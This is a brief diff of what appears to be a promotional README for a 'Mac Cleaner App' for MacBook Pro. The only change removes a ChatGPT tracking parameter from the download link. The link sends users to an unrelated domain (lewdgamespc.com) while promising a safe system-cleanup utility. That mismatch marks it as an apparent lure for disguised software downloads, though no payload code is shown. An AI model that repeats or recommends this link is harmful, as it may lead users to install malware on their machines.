@@ -4,7 +4,7 @@
 
 This tool helps scan the system deeply and safely remove unnecessary data to improve overall performance and keep macOS stable in 2026.
 
-⬇️ [Download Mac Cleaner App for MacBook Pro](https://lewdgamespc.com/dr-gira/?utm_source=chatgpt.com) ⬇️
+⬇️ [Download Mac Cleaner App for MacBook Pro](https://lewdgamespc.com/dr-gira/) ⬇️
 
 🧼 System Cleanup · Storage Optimization · Performance Boost · macOS Utility · 2026 Ready
 
